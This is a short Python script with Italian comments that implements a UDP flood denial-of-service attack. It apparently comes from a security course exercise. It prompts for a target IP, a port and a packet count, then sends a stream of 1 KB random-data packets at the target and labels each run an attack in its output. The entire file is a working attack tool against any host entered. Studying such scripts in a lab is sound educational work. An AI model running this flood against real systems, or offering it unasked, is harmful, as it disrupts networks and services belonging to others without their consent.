import socket  #Permette di creare connessioni di rete (In questo caso per noi, UDP).
import random  #Usato per generara dati causale (per riempire i pacchetti).
import time    #Per Mettere una piccola pausa tra un pacchetto e l'altro.

## Definiamo adesso la funzione pricinpale - definendo i 3 parametri richiesti nell'esercizio
def udp_flood(target_ip, target_port, num_packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  #Socket.AF_INET ovvero usa IPv4-Mentre socket.SOCK_DGRAM specifica il protocollo usato, in questo caso UDP, non TCP
    bytes_per_packet = 1024  # Ogni pacchetto sarà lungo 1024 byte = 1 KB

    print(f"[*] Inizio attacco UDP Flood su {target_ip}:{target_port} con {num_packets} pacchetti da 1KB.")

    for i in range(num_packets): ## Ciclo di invio pacchetti = ripete il interno num_packets (volte) - 
        data = random._urandom(bytes_per_packet)  # Genera dati casuali da 1KB
        sock.sendto(data, (target_ip, target_port))
        print(f"[+] Pacchetto {i+1}/{num_packets} inviato")
        time.sleep(0.01)  # Piccola pausa per evitare congestione locale (facoltativo)

    print("[✓] Attacco completato.")

if __name__ == "__main__":
    target_ip = input("Inserisci l'IP della macchina target: ")
    target_port = int(input("Inserisci la porta UDP target: "))
    num_packets = int(input("Quanti pacchetti da 1KB vuoi inviare? "))

    udp_flood(target_ip, target_port, num_packets)
